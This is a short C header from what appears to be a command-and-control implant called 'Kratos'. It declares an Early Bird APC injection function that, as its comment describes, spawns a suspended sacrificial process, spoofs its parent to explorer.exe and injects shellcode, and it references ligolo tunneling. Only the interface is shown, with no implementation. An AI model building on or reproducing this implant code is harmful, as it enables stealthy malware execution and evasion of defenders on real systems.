#ifndef KRATOS_INJECT_H
#define KRATOS_INJECT_H

#include <windows.h>

#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START)

/* Default sacrificial host process */
#define INJECT_DEFAULT_SPAWNTO "C:\\Windows\\System32\\notepad.exe"

/* Path of the sacrificial process used by spawn/ligolo fork+run.
 * Updated by command_spawnto. */
extern char g_spawnto_path[512];

typedef struct {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  pid;
} EarlyBirdResult;

/*
 * Early Bird APC injection into g_spawnto_path.
 * Spawns suspended, PPID-spoofs to explorer.exe, injects shellcode, resumes.
 * cmdline_override: full lpCommandLine string (e.g. "notepad.exe -connect x:y").
 *                   If NULL, uses g_spawnto_path as argv[0] with no extra args.
 * Returns 1 on success - caller owns out->hProcess and out->hThread.
 * Returns 0 on failure - errmsg filled with reason.
 */
int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                     const char *cmdline_override,
                     EarlyBirdResult *out, char *errmsg, size_t errmsg_len);

#endif /* INCLUDE_CMD_SPAWN || INCLUDE_CMD_SPAWNTO || INCLUDE_CMD_LIGOLO_START */

#endif /* KRATOS_INJECT_H */
